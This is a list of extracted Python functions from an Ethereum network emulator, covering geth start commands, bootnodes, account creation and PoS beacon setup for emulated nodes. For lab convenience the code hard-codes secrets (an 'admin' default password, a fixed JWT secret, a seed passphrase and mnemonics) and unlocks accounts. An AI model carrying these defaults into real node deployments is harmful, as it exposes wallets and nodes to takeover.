  "def _generateGethStartCommand(self):\n        \"\"\"!\n        @brief generate geth start commands from the properties. \n\n        @returns geth command. \n        \"\"\"\n        if self._no_discover:\n            self._geth_options['finding_peers'] = GethCommandTemplates['nodiscover']\n        else:\n            self._geth_options['finding_peers'] = GethCommandTemplates['bootnodes']\n        if self._enable_http:\n            self._geth_options['http'] = GethCommandTemplates['http'].format(gethHttpPort=self._geth_http_port)\n        if self._enable_ws:\n            self._geth_options['ws'] = GethCommandTemplates['ws'].format(gethWsPort=self._geth_ws_port)\n        if self._custom_geth_command_option:\n            self._geth_options['custom'] = self._custom_geth_command_option\n        if self._unlock_accounts:\n            accounts = []\n            for account in self._accounts:\n                accounts.append(account.address)\n            self._geth_options['unlock'] = GethCommandTemplates['unlock'].format(accounts=', '.join(accounts))\n        self._geth_start_command = GethCommandTemplates['base'].format(node_id=self._id, chain_id=self._blockchain.getChainId(), datadir=self._data_dir, syncmode=self._syncmode.value, snapshot=self._snapshot, option=self._geth_options)",
  "def install(self, node: Node, eth: EthereumService):\n        \"\"\"!\n        @brief ETH server installation step.\n        \n        @param node node object\n        @param eth reference to the eth service.\n        @param allBootnode all-bootnode mode: all nodes are boot node.\n        \n        \"\"\"\n\n        node.appendClassName('EthereumService')\n        node.setLabel(ETH_LABEL_META.format(key='node_id'), self.getId())\n        node.setLabel(ETH_LABEL_META.format(key='consensus'), self._consensus_mechanism.value)\n        node.setLabel(ETH_LABEL_META.format(key='chain_name'), self._blockchain.getChainName())\n        node.setLabel(ETH_LABEL_META.format(key='chain_id'), self._blockchain.getChainId())\n        \n        if self.isBootNode(): self._role.append(\"bootnode\")\n        if self.isStartMiner(): self._role.append(\"miner\")\n        node.setLabel(ETH_LABEL_META.format(key='role'), json.dumps(self._role).replace(\"\\\"\", \"\\\\\\\"\"))\n\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'EthereumServer::install: node as{}/{} has no interfaces'.format(node.getAsn(), node.getName())\n        addr = str(ifaces[0].getAddress())\n\n        self.__genesis = self._blockchain.getGenesis()\n\n        node.setFile('/tmp/eth-genesis.json', self.__genesis.getGenesis())\n    \n        # set account passwords to /tmp/eth-password\n        account_passwords = []\n\n        for account in self._accounts:\n            node.setFile(\"/tmp/keystore/\"+account.keystore_filename, account.keystore_content)\n            account_passwords.append(account.password)\n\n        node.setFile('/tmp/eth-password', '\\n'.join(account_passwords))\n\n        # install required software\n        # node.addSoftware('software-properties-common')\n        # tap the eth repo\n        # node.addBuildCommand('add-apt-repository ppa:ethereum/ethereum')\n\n        # install geth and bootnode\n        if self._custom_geth_binary_path : \n            #node.addBuildCommand('apt-get update && apt-get install --yes bootnode')\n            node.importFile(\"../../\"+self._custom_geth_binary_path, '/usr/bin/geth')\n            node.appendStartCommand(\"chmod +x /usr/bin/geth\")\n        # else:\n        #     node.addBuildCommand('apt-get update && apt-get install --yes geth bootnode')\n\n        # genesis\n        node.appendStartCommand('[ ! -e \"/root/.ethereum/geth/nodekey\" ] && geth --datadir {} init /tmp/eth-genesis.json'.format(self._data_dir))\n        \n        # copy keystore to the proper folder\n        for account in self._accounts:\n            node.appendStartCommand(\"cp /tmp/keystore/{} /root/.ethereum/keystore/\".format(account.keystore_filename))\n\n        if self._is_bootnode:\n            # generate enode url. other nodes will access this to bootstrap the network.\n            node.appendStartCommand('[ ! -e \"/root/.ethereum/geth/bootkey\" ] && bootnode -genkey /root/.ethereum/geth/bootkey')\n            node.appendStartCommand('echo \"enode://$(bootnode -nodekey /root/.ethereum/geth/bootkey -writeaddress)@{}:30301\" > /tmp/eth-enode-url'.format(addr))\n            \n            # Default port is 30301, use -addr :<port> to specify a custom port\n            node.appendStartCommand('bootnode -nodekey /root/.ethereum/geth/bootkey -verbosity 9 -addr {}:30301 2> /tmp/bootnode-logs &'.format(addr))          \n            node.appendStartCommand('python3 -m http.server {} -d /tmp'.format(self._bootnode_http_port), True)\n\n        # get other nodes IP for the bootstrapper.\n        bootnodes = self._blockchain.getBootNodes()[:]\n        if len(bootnodes) > 0 :\n            node.setFile('/tmp/eth-nodes', '\\n'.join(bootnodes))\n            \n            node.setFile('/tmp/eth-bootstrapper', EthServerFileTemplates['bootstrapper'])\n\n            # load enode urls from other nodes\n            node.appendStartCommand('chmod +x /tmp/eth-bootstrapper')\n            node.appendStartCommand('/tmp/eth-bootstrapper')\n\n        # launch Ethereum process.\n        node.appendStartCommand(self._geth_start_command, True)",
  "def setCustomGeth(self, customGethBinaryPath:str) -> EthereumServer:\n        \"\"\"\n        @brief set custom geth binary file\n\n        @param customGethBinaryPath set absolute path of geth binary to move to the service.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert path.exists(customGethBinaryPath), \"EthereumServer::setCustomGeth: custom geth binary file does not exist. path : {}\".format(customGethBinaryPath)\n\n        self._custom_geth_binary_path = customGethBinaryPath\n\n        return self",
  "def setCustomGethCommandOption(self, customOptions:str) -> EthereumServer:\n        \"\"\"\n        @brief set custom geth start command option\n\n        @param customOptions options to set\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert customOptions.startswith(\"--\"), \"option should start with '--'\"\n        assert \";\" not in customOptions, \"letter ';' cannot contain in the options\"\n        assert \"&\" not in customOptions, \"letter '|' cannot contain in the options\"\n        assert \"|\" not in customOptions, \"letter '|' cannot contain in the options\"\n\n        self._custom_geth_command_option = customOptions\n        return self",
  "def setSyncmode(self, syncmode:Syncmode) -> EthereumServer:\n        \"\"\"\n        @brief setting geth syncmode (default: snap)\n        \n        @param syncmode use Syncmode enum options.\n                Syncmode.SNAP, Syncmode.FULL, Syncmode.LIGHT\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._syncmode = syncmode\n        return self",
  "def setNoDiscover(self, noDiscover:bool = True) -> EthereumServer:\n        \"\"\"\n        @brief setting the automatic peer discovery to true/false\n        \"\"\"\n        self._no_discover = noDiscover\n        return self",
  "def setSnapshot(self, snapshot:bool = True) -> EthereumServer:\n        \"\"\"!\n        @brief set geth snapshot \n        \n        @param snapshot bool\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._snapshot = snapshot\n        return self",
  "def getId(self) -> int:\n        \"\"\"!\n        @brief get ID of this node.\n        @returns ID.\n        \"\"\"\n        return self._id",
  "def setBootNode(self, isBootNode: bool) -> EthereumServer:\n        \"\"\"!\n        @brief set bootnode status of this node.\n        Note: if no nodes are configured as boot nodes, all nodes will be each\n        other's boot nodes.\n        @param isBootNode True to set this node as a bootnode, False otherwise.\n        \n        @returns self, for chaining API calls.\n        \"\"\"\n        self._is_bootnode = isBootNode\n\n        return self",
  "def isBootNode(self) -> bool:\n        \"\"\"!\n        @brief get bootnode status of this node.\n        @returns True if this node is a boot node. False otherwise.\n        \"\"\"\n        return self._is_bootnode",
  "def setBootNodeHttpPort(self, port: int) -> EthereumServer:\n        \"\"\"!\n        @brief set the http server port number hosting the enode url file.\n        @param port port\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        self._bootnode_http_port = port\n\n        return self",
  "def getBootNodeHttpPort(self) -> int:\n        \"\"\"!\n        @brief get the http server port number hosting the enode url file.\n        @returns port\n        \"\"\"\n\n        return self._bootnode_http_port",
  "def setGethHttpPort(self, port: int) -> EthereumServer:\n        \"\"\"!\n        @brief set the http server port number for normal ethereum nodes\n        @param port port\n        @returns self, for chaining API calls\n        \"\"\"\n        \n        self._geth_http_port = port\n        \n        return self",
  "def getGethHttpPort(self) -> int:\n        \"\"\"!\n        @brief get the http server port number for normal ethereum nodes\n        @returns int\n        \"\"\"\n                \n        return self._geth_http_port",
  "def setGethWsPort(self, port: int) -> EthereumServer:\n        \"\"\"!\n        @brief set the ws server port number for normal ethereum nodes\n\n        @param port port\n\n        @returns self, for chaining API calls\n        \"\"\"\n        \n        self._geth_ws_port = port\n        \n        return self",
  "def getGethWsPort(self) -> int:\n        \"\"\"!\n        @brief get the ws server port number for normal ethereum nodes\n\n        @returns int\n        \"\"\"\n                \n        return self._geth_ws_port",
  "def enableGethHttp(self) -> EthereumServer:\n        \"\"\"!\n        @brief setting a geth to enable http connection \n        \"\"\"\n        self._enable_http = True\n\n        return self",
  "def isGethHttpEnabled(self) -> bool:\n        \"\"\"!\n        @brief returns whether a geth enabled http connection or not\n        \"\"\"\n        return self._enable_http",
  "def enableGethWs(self) -> EthereumServer:\n        \"\"\"!\n        @brief setting a geth to enable ws connection\n        \"\"\"\n        self._enable_ws = True\n\n        return self",
  "def isGethWsEnabled(self) -> bool:\n        \"\"\"!\n        @brief returns whether a geth enabled ws connection or not\n        \"\"\"\n\n        return self._enable_ws",
  "def createAccount(self, balance:int, unit:EthUnit=EthUnit.ETHER, password=\"admin\") -> EthereumServer:\n        \"\"\"\n        @brief call this api to create new accounts\n\n        @param balance the balance to be allocated to the account.\n        @param unit EthUnit (Default: EthUnit.Ether)\n\n        @returns self, for chaining API calls.\n\n        \"\"\"\n\n        balance = balance * unit.value\n        self._mnemonic_accounts.append(EthAccount.createEmulatorAccountFromMnemonic(self._id, mnemonic=self._mnemonic, balance=balance, index=self._account_total, password=password))\n        self._account_total += 1\n        return self",
  "def createAccounts(self, total:int, balance:int, unit:EthUnit=EthUnit.ETHER, password=\"admin\") -> EthereumServer:\n        \"\"\"\n        @brief Call this api to create new accounts.\n\n        @param total The total number of account need to create.\n        @param balance The balance to allocate to the accounts.\n        @param unit The unit of Ethereum. EthUnit (Default: EthUnit.Ether).\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        for i in range(total):\n            self.createAccount(balance, unit, password)\n\n        return self",
  "def _createAccounts(self, eth:EthereumService) -> EthereumServer:\n        \"\"\"\n        @brief Call this api to create new accounts from account_info\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._accounts.extend(self._mnemonic_accounts)\n\n        return self",
  "def importAccount(self, keyfilePath:str, password:str = \"admin\", balance: int = 0, unit:EthUnit=EthUnit.ETHER) -> EthereumServer:\n        \"\"\"\n        @brief Call this api to import an account.\n\n        @param keyfilePath The keyfile path to import.\n        @param password The password to decrypt the keyfile.\n        @param balance The balance to allocate to the account.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        assert path.exists(keyfilePath), \"EthereumServer::importAccount: keyFile does not exist. path : {}\".format(keyfilePath)\n        account = EthAccount.importAccount(balance=balance,password=password, keyfilePath=keyfilePath)\n        self._accounts.append(account)\n        return self",
  "def _getAccounts(self) -> List[AccountStructure]:\n        \"\"\"\n        @brief Call this api to get the accounts for this node\n        \n        @returns accounts\n        \"\"\"\n\n        return self._accounts",
  "def unlockAccounts(self) -> EthereumServer:\n        \"\"\"!\n        @brief This is mainly used to unlock the accounts in the remix node to make it directly possible for transactions to be \n        executed through Remix without the need to access the geth account in the docker container and unlocking manually\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._unlock_accounts = True\n\n        return self",
  "def startMiner(self) -> EthereumServer:\n        \"\"\"!\n        @brief Call this api to start Miner in the node.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._start_mine = True\n        self._syncmode = Syncmode.FULL\n\n        return self",
  "def isStartMiner(self) -> bool:\n        \"\"\"!\n        @brief Call this api to get startMiner status in the node.\n        \n        @returns __start_mine status.\n        \"\"\"\n        return self._start_mine",
  "def deploySmartContract(self, smart_contract: SmartContract) -> EthereumServer:\n        \"\"\"!\n        @brief Call this api to deploy smartContract on the node.\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._smart_contract = smart_contract\n\n        return self",
  "def getBlockchain(self):\n        return self._blockchain",
  "def __init__(self, id: int, blockchain: Blockchain):\n        \"\"\"!\n        @brief Create new eth server.\n\n        @param id The serial number of this server.\n        \"\"\"\n\n        super().__init__(id, blockchain)",
  "def _generateGethStartCommand(self):\n        if self._start_mine:\n            assert len(self._accounts) > 0, 'EthereumServer::__generateGethStartCommand: To start mine, ethereum server need at least one account.'\n            assert self._unlock_accounts, 'EthereumServer::__generateGethStartCommand: To start mine in POA(clique), accounts should be unlocked first.'\n            if self._coinbase:\n                coinbase = self._coinbase\n            else:\n                coinbase = self._accounts[0].address\n            self._geth_options['mine'] = GethCommandTemplates['mine'].format(coinbase=coinbase, num_of_threads=self._miner_thread)\n        super()._generateGethStartCommand()",
  "def __init__(self, id:int, blockchain:Blockchain):\n        \"\"\"!\n        @brief Create new eth server.\n\n        @param id The serial number of this server.\n        \"\"\"\n\n        super().__init__(id, blockchain)",
  "def _generateGethStartCommand(self):\n        super()._generateGethStartCommand()\n\n        self._geth_start_command = \"nice -n 19 \" + self._geth_start_command\n        if self._start_mine:\n            if self._coinbase:\n                coinbase = self._coinbase\n            else:\n                coinbase = self._accounts[0].address\n            assert len(self._accounts) > 0, 'EthereumServer::__generateGethStartCommand: To start mine, ethereum server need at least one account.'\n            self._geth_start_command += GethCommandTemplates['mine'].format(coinbase=coinbase, num_of_threads=self._miner_thread)",
  "def __init__(self, id: int, blockchain:Blockchain):\n        \"\"\"!\n        @brief Create new eth server.\n\n        @param id Serial number of this server.\n        \"\"\"\n\n        super().__init__(id, blockchain)\n\n        self.__is_beacon_setup_node = False\n        self.__beacon_setup_http_port = 8090\n        self.__terminal_total_difficulty = self._blockchain.getTerminalTotalDifficulty()\n        self.__is_beacon_validator_at_genesis = False\n        self.__is_beacon_validator_at_running = False\n        self.__is_manual_deposit_for_validator = False\n        self.__beacon_peer_counts = 5",
  "def _generateGethStartCommand(self):\n        self._geth_options['pos'] = GethCommandTemplates['pos'].format(difficulty=self.__terminal_total_difficulty)\n        super()._generateGethStartCommand()",
  "def __install_beacon(self, node:Node, eth:EthereumService):\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'EthereumServer::install: node as{}/{} has no interfaces'.format(node.getAsn(), node.getName())\n        addr = str(ifaces[0].getAddress())\n\n        beacon_setup_node = self._blockchain.getBeaconSetupNodeIp()\n\n        assert beacon_setup_node != \"\", 'EthereumServer::install: Ethereum Service has no beacon_setup_node.'\n\n        bootnode_start_command = \"\"\n        bc_start_command = LIGHTHOUSE_BN_CMD.format(eth_id=self.getId(),ip_address=addr, target_peers=self.__beacon_peer_counts)\n        vc_start_command = \"\"\n        wallet_create_command = \"\"\n        validator_create_command = \"\"\n        validator_deposit_sh = \"\"\n        if self._is_bootnode:\n            bootnode_start_command = LIGHTHOUSE_BOOTNODE_CMD.format(ip_address=addr)\n        if self.__is_beacon_validator_at_running:\n            node.setFile('/tmp/seed.pass', 'seedseedseed')\n            wallet_create_command = LIGHTHOUSE_WALLET_CREATE_CMD.format(eth_id=self.getId())\n            validator_create_command = LIGHTHOUSE_VALIDATOR_CREATE_CMD.format(eth_id=self.getId()) \n            node.setFile('/tmp/deposit.sh', VALIDATOR_DEPOSIT_SH.format(eth_id=self.getId()))\n            node.appendStartCommand('chmod +x /tmp/deposit.sh')\n            if not self.__is_manual_deposit_for_validator:\n                validator_deposit_sh = \"/tmp/deposit.sh\"\n        if self.__is_beacon_validator_at_genesis or self.__is_beacon_validator_at_running:\n            vc_start_command = LIGHTHOUSE_VC_CMD.format(eth_id=self.getId(), ip_address=addr, acct_address=self._accounts[0].address)\n            \n        node.setFile('/tmp/beacon-setup-node', beacon_setup_node)\n        node.setFile('/tmp/beacon-bootstrapper', EthServerFileTemplates['beacon_bootstrapper'].format( \n                                is_validator=\"true\" if self.__is_beacon_validator_at_genesis else \"false\",\n                                is_bootnode=\"true\" if self._is_bootnode else \"false\",\n                                eth_id=self.getId(),\n                                bootnode_start_command=bootnode_start_command,\n                                bc_start_command=bc_start_command,\n                                vc_start_command=vc_start_command,\n                                wallet_create_command=wallet_create_command,\n                                validator_create_command=validator_create_command,\n                                validator_deposit_sh=validator_deposit_sh\n                    ))\n        node.setFile('/tmp/jwt.hex', '0xae7177335e3d4222160e08cecac0ace2cecce3dc3910baada14e26b11d2009fc')\n        \n        node.appendStartCommand('chmod +x /tmp/beacon-bootstrapper')\n        node.appendStartCommand('/tmp/beacon-bootstrapper')",
  "def install(self, node: Node, eth: EthereumService):\n        if self.__is_beacon_setup_node:\n            beacon_setup_node = BeaconSetupServer(ttd=self.__terminal_total_difficulty)\n            beacon_setup_node.install(node, self._blockchain)\n            return \n        \n        if self.__is_beacon_validator_at_genesis:\n            self._role.append(\"validator_at_genesis\")\n        if self.__is_beacon_validator_at_running:\n            self._role.append(\"validator_at_running\")\n        \n        super().install(node,eth)\n        self.__install_beacon(node, eth)",
  "def enablePOSValidatorAtGenesis(self):\n        self.__is_beacon_validator_at_genesis = True\n        return self",
  "def isValidatorAtGenesis(self):\n        return self.__is_beacon_validator_at_genesis",
  "def isValidatorAtRunning(self):\n        return self.__is_beacon_validator_at_running",
  "def enablePOSValidatorAtRunning(self, is_manual:bool=False):\n        self.__is_beacon_validator_at_running = True\n        self.__is_manual_deposit_for_validator = is_manual\n        return self",
  "def isBeaconSetupNode(self):\n        return self.__is_beacon_setup_node",
  "def setBeaconSetupNode(self, port=8090):\n        self.__is_beacon_setup_node = True\n        self.__beacon_setup_http_port = port\n        return self",
  "def getBeaconSetupNodeIp(self):\n        return self.__beacon_setup_node_ip",
  "def setBeaconPeerCounts(self, peer_counts:int):\n        self.__beacon_peer_counts = peer_counts\n        return self",
  "def getBeaconSetupHttpPort(self) -> int:\n        return self.__beacon_setup_http_port",
  "def setBeaconSetupHttpPort(self, port:int):\n        self.__beacon_setup_http_port = port\n        return self",
  "def __init__(self, ttd:int, consensus:ConsensusMechanism = ConsensusMechanism.POA):\n        \"\"\"!\n        @brief BeaconSetupServer constructor.\n        \"\"\"\n\n        self.__beacon_setup_http_port = 8090\n        self.__terminal_total_difficulty = ttd\n        self.__consensus_mechanism = consensus",
  "def install(self, node: Node, blockchain: Blockchain):\n        \"\"\"!\n        @brief Install the service.\n        \"\"\"\n        \n        validator_ids = blockchain.getValidatorIds()\n        validator_counts = len(validator_ids)\n\n        bootnode_ip = blockchain.getBootNodes()[0].split(\":\")[0]\n        miner_ip = blockchain.getMinerNodes()[0]\n        \n        #node.addBuildCommand('apt-get update && apt-get install -y --no-install-recommends software-properties-common python3 python3-pip')\n        #node.addBuildCommand('pip install web3')\n        node.appendStartCommand('lcli generate-bootnode-enr --ip {} --udp-port 30305 --tcp-port 30305 --genesis-fork-version 0x42424242 --output-dir /local-testnet/bootnode'.format(bootnode_ip))\n        node.setFile(\"/tmp/config.yaml\", self.BEACON_GENESIS.format(terminal_total_difficulty=self.__terminal_total_difficulty, chain_id=blockchain.getChainId(), \n                                                                    target_committee_size=blockchain.getTargetCommitteeSize(), \n                                                                    target_aggregator_per_committee = blockchain.getTargetAggregatorPerCommittee()))\n        node.setFile(\"/tmp/validator-ids\", \"\\n\".join(validator_ids))\n        node.appendStartCommand('mkdir /local-testnet/testnet')\n        node.appendStartCommand('bootnode_enr=`cat /local-testnet/bootnode/enr.dat`')\n        node.appendStartCommand('echo \"- $bootnode_enr\" > /local-testnet/testnet/boot_enr.yaml')\n        node.appendStartCommand('cp /tmp/config.yaml /local-testnet/testnet/config.yaml')\n        node.appendStartCommand(self.DEPLOY_CONTRACT.format(geth_node_ip=miner_ip, validator_count = validator_counts))\n        node.appendStartCommand('lcli insecure-validators --count {validator_count} --base-dir /local-testnet/ --node-count {validator_count}'.format(validator_count = validator_counts))\n        node.appendStartCommand('GENESIS_TIME=`date +%s`')\n        node.appendStartCommand('''CONTRACT_ADDRESS=`head -1 contract_address.txt | cut -d '\"' -f 2`''')\n        node.appendStartCommand('''echo 'DEPOSIT_CONTRACT_ADDRESS: \"'$CONTRACT_ADDRESS'\"' >> /local-testnet/testnet/config.yaml''')\n        node.appendStartCommand('''echo 'MIN_GENESIS_TIME: \"'$GENESIS_TIME'\"' >> /local-testnet/testnet/config.yaml''')\n        node.appendStartCommand('''echo '3' > /local-testnet/testnet/deploy_block.txt''')\n        node.appendStartCommand('''lcli interop-genesis --spec mainnet --genesis-time $GENESIS_TIME --testnet-dir /local-testnet/testnet {validator_count}'''.format(validator_count = validator_counts))\n        node.setFile(\"/tmp/prepare_resource.sh\", self.PREPARE_RESOURCE_TO_SEND)\n        node.appendStartCommand(\"chmod +x /tmp/prepare_resource.sh\")\n        node.appendStartCommand(\"/tmp/prepare_resource.sh\")\n        node.setFile('/local-testnet/beacon_bootnode_http_server.py', self.BEACON_BOOTNODE_HTTP_SERVER.format(beacon_bootnode_http_port=self.__beacon_setup_http_port))\n        node.appendStartCommand('python3 /local-testnet/beacon_bootnode_http_server.py', True)",
  "def getBeaconSetupHttpPort(self) -> int:\n        return self.__beacon_setup_http_port",
  "def setBeaconSetupHttpPort(self, port:int) -> BeaconSetupServer:\n        self.__beacon_setup_http_port = port\n        return self",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Beacon Setup server object.\\n'\n\n        return out",
  "class Blockchain:\n    \"\"\"!\n    @brief The individual blockchain in EthereumService.\n    This Blockchain class allows to maintain multiple blockchains inside EthereumService.\n    \"\"\"\n    __consensus: ConsensusMechanism\n    __genesis: Genesis\n    __eth_service: EthereumService\n    __boot_node_addresses: Dict[ConsensusMechanism, List[str]]\n    __joined_accounts: List[AccountStructure]\n    __joined_signer_accounts: List[AccountStructure]\n    __validator_ids: List[str]\n    __beacon_setup_node_address: str\n    __chain_id:int\n    __pending_targets:list\n    __chain_name:str\n    __emu_mnemonic:str\n    __total_accounts_per_node: int\n    __emu_account_balance: int\n    __local_mnemonic:str\n    __local_accounts_total:int\n    __local_account_balance:int\n    __terminal_total_difficulty:int\n    __target_aggregater_per_committee:int\n    __target_committee_size:int\n\n    def __init__(self, service:EthereumService, chainName: str, chainId: int, consensus:ConsensusMechanism):\n        \"\"\"!\n        @brief The Blockchain class initializer.\n\n        @param service The EthereumService that creates the Blockchain class instance.\n        @param chainName The name of the Blockchain to create.\n        @param chainid The chain id of the Blockchain to create.\n        @param consensus The consensus of the Blockchain to create (supports POA, POS, POW).\n\n        @returns An instance of The Blockchain class.\n        \"\"\"\n        self.__eth_service = service\n        self.__consensus = consensus\n        self.__chain_name = chainName\n        self.__genesis = Genesis(ConsensusMechanism.POA) if self.__consensus == ConsensusMechanism.POS else Genesis(self.__consensus)\n        self.__boot_node_addresses = []\n        self.__miner_node_address = []\n        self.__joined_accounts = []\n        self.__joined_signer_accounts = []\n        self.__validator_ids = []\n        self.__beacon_setup_node_address = ''\n        self.__pending_targets = []\n        self.__emu_mnemonic = \"great awesome fun seed security lab protect system network prevent attack future\"\n        self.__total_accounts_per_node = 1\n        self.__emu_account_balance = 32 * EthUnit.ETHER.value\n        self.__local_mnemonic = \"great amazing fun seed lab protect network system security prevent attack future\"\n        self.__local_accounts_total = 5\n        self.__local_account_balance = 10 * EthUnit.ETHER.value\n        self.__chain_id = chainId\n        self.__terminal_total_difficulty = 20\n        self.__target_aggregater_per_committee = 2\n        self.__target_committee_size = 3\n\n    def _doConfigure(self, node:Node, server:EthereumServer):\n        self._log('configuring as{}/{} as an eth node...'.format(node.getAsn(), node.getName()))\n\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'EthereumService::_doConfigure(): node as{}/{} has not interfaces'.format()\n        addr = '{}:{}'.format(str(ifaces[0].getAddress()), server.getBootNodeHttpPort())\n        \n        if server.isBootNode():\n            self._log('adding as{}/{} as consensus-{} bootnode...'.format(node.getAsn(), node.getName(), self.__consensus.value))\n            self.__boot_node_addresses.append(addr)\n        \n        if self.__consensus == ConsensusMechanism.POS:\n            if server.isStartMiner():\n                self._log('adding as{}/{} as consensus-{} miner...'.format(node.getAsn(), node.getName(), self.__consensus.value))\n                self.__miner_node_address.append(str(ifaces[0].getAddress())) \n            if server.isBeaconSetupNode():\n                self.__beacon_setup_node_address = '{}:{}'.format(ifaces[0].getAddress(), server.getBeaconSetupHttpPort())\n\n        server._createAccounts(self)\n        \n        accounts = server._getAccounts()\n        if len(accounts) > 0:\n            if self.__consensus == ConsensusMechanism.POS and server.isValidatorAtRunning():\n                accounts[0].balance = 33 * EthUnit.ETHER.value\n            self.__joined_accounts.extend(accounts)\n            if self.__consensus in [ConsensusMechanism.POA, ConsensusMechanism.POS] and server.isStartMiner():\n                self.__joined_signer_accounts.append(accounts[0])\n\n        if self.__consensus == ConsensusMechanism.POS and server.isValidatorAtGenesis():\n            self.__validator_ids.append(str(server.getId()))\n        \n        server._generateGethStartCommand()\n\n        if self.__eth_service.isSave():\n            save_path = self.__eth_service.getSavePath()\n            node.addSharedFolder('/root/.ethereum', '../{}/{}/{}/ethereum'.format(save_path, self.__chain_name, server.getId()))\n            node.addSharedFolder('/root/.ethash', '../{}/{}/{}/ethash'.format(save_path, self.__chain_name, server.getId()))\n            makedirs('{}/{}/{}/ethereum'.format(save_path, self.__chain_name, server.getId()))\n            makedirs('{}/{}/{}/ethash'.format(save_path, self.__chain_name, server.getId()))\n\n    def configure(self, emulator:Emulator):\n        pending_targets = self.__eth_service.getPendingTargets()\n        localAccounts = EthAccount.createLocalAccountsFromMnemonic(mnemonic=self.__local_mnemonic, balance=self.__local_account_balance, total=self.__local_accounts_total)\n        self.__genesis.addAccounts(localAccounts)\n        self.__genesis.setChainId(self.__chain_id)\n        for vnode in self.__pending_targets:\n            node = emulator.getBindingFor(vnode)\n            server = pending_targets[vnode]\n            if self.__consensus == ConsensusMechanism.POS and server.isStartMiner():\n                ifaces = node.getInterfaces()\n                assert len(ifaces) > 0, 'EthereumService::_doConfigure(): node as{}/{} has not interfaces'.format()\n                addr = str(ifaces[0].getAddress())\n                miner_ip = self.__miner_node_address[0]\n                if addr == miner_ip:\n                    validator_count = len(self.getValidatorIds())\n                    index = self.__joined_accounts.index(server._getAccounts()[0])\n                    self.__joined_accounts[index].balance = 32*pow(10,18)*(validator_count+2)\n        \n        self.__genesis.addAccounts(self.getAllAccounts())\n        \n        if self.__consensus in [ConsensusMechanism.POA, ConsensusMechanism.POS] :\n            self.__genesis.setSigner(self.getAllSignerAccounts())\n    \n    def getBootNodes(self) -> List[str]:\n        \"\"\"!\n        @brief Get bootnode IPs.\n\n        @returns List of bootnodes IP addresses.\n        \"\"\"\n        return self.__boot_node_addresses\n\n    def getMinerNodes(self) -> List[str]:\n        \"\"\"!\n        @brief Get miner node IPs.\n\n        @returns List of miner nodes IP addresses.\n        \"\"\"\n        return self.__miner_node_address\n\n    def getAllAccounts(self) -> List[AccountStructure]:\n        \"\"\"!\n        @brief Get a joined list of all the created accounts on all nodes in the blockchain.\n        \n        @returns List of accounts.\n        \"\"\"\n        return self.__joined_accounts\n\n    def getAllSignerAccounts(self) -> List[AccountStructure]:\n        \"\"\"!\n        @brief Get a list of all signer accounts on all nodes in the blockchain.\n        \n        returns List of signer accounts.\n        \"\"\"\n        return self.__joined_signer_accounts\n\n    def getValidatorIds(self) -> List[str]:\n        \"\"\"!\n        @brief Get a list of all validators ids on all nodes in the blockchain.\n        \n        @returns List of all validators ids.\n        \"\"\"\n        return self.__validator_ids\n\n    def getBeaconSetupNodeIp(self) -> str:\n        \"\"\"!\n        @brief Get the IP of a beacon setup node.\n\n        @returns The IP address.\n        \"\"\"\n        return self.__beacon_setup_node_address\n\n    def setGenesis(self, genesis:str) -> EthereumServer:\n        \"\"\"!\n        @brief Set the custom genesis.\n        \n        @param genesis The genesis file contents to set. \n\n        @returns Self, for chaining API calls.\n        \"\"\"\n        self.__genesis.setGenesis(genesis)\n\n        return self\n\n    def getGenesis(self) -> Genesis:\n        \"\"\"!\n        @brief Get the genesis file content.\n\n        @returns Genesis. \n        \"\"\"\n        return self.__genesis\n\n    def setConsensusMechanism(self, consensus:ConsensusMechanism) -> EthereumServer:\n        \"\"\"!\n        @brief Set consensus mechanism of this blockchain.\n\n        @param consensusMechanism Consensus mechanism to set (supports POW, POA and POS).\n\n        @returns Self, for chaining API calls. \n        \"\"\"\n        self.__consensus = consensus\n        self.__genesis = Genesis(self.__consensus)\n        \n        return self\n\n    def getConsensusMechanism(self) -> ConsensusMechanism:\n        \"\"\"!\n        @brief Get the consensus mechanism of this blockchain.\n\n        @returns ConsensusMechanism\n        \"\"\"\n        return self.__consensus\n    \n    def setTerminalTotalDifficulty(self, ttd:int):\n        \"\"\"!\n        @brief Set the terminal total difficulty, which is the value to designate\n                when the Merge is happen. In POA, difficulty is tend to increase by 2\n                for every one block. For example, if the terminal_total_difficulty is \n                set to 20, the Ethereum blockchain will keep POA consensus for approximately\n                150 sec (20/2*15) and then stop signing the block until the Merge happens.\n                Default to 20. \n\n        @param ttd The terminal total difficulty to set.\n        \n        @returns Self, for chaining API calls.\n        \"\"\"\n        self.__terminal_total_difficulty = ttd\n\n        return self\n\n    def getTerminalTotalDifficulty(self) -> int:\n        \"\"\"!\n        @brief Get the value of the terminal total difficulty.\n        \n        @returns terminal_total_difficulty.\n        \"\"\"\n\n        return self.__terminal_total_difficulty\n\n    def setGasLimitPerBlock(self, gasLimit:int):\n        \"\"\"!\n        @brief Set GasLimit at Genesis (the limit of gas cost per block).\n\n        @param gasLimit The gas limit per block.\n        \n        @returns Self, for chaining API calls.\n        \"\"\"\n        self.__genesis.setGasLimit(gasLimit)\n        return self\n\n    def setChainId(self, chainId:int):\n        \"\"\"!\n        @brief Set chain Id at Genesis.\n\n        @param chainId The chain Id to set.\n\n        @returns Self, for chaining API calls\n        \"\"\"\n\n        self.__chain_id = chainId\n        return self\n\n    def createNode(self, vnode: str) -> EthereumServer:\n        \"\"\"!\n        @brief Create a node belongs to this blockchain.\n\n        @param vnode The name of vnode.\n\n        @returns EthereumServer\n        \"\"\"\n        eth = self.__eth_service\n        self.__pending_targets.append(vnode)\n        return eth.installByBlockchain(vnode, self)\n    \n    def addLocalAccount(self, address: str, balance: int, unit:EthUnit=EthUnit.ETHER) -> Blockchain:\n        \"\"\"!\n        @brief Allocate balance to an external account by setting alloc field of genesis file.\n\n        @param address The External account's address.\n        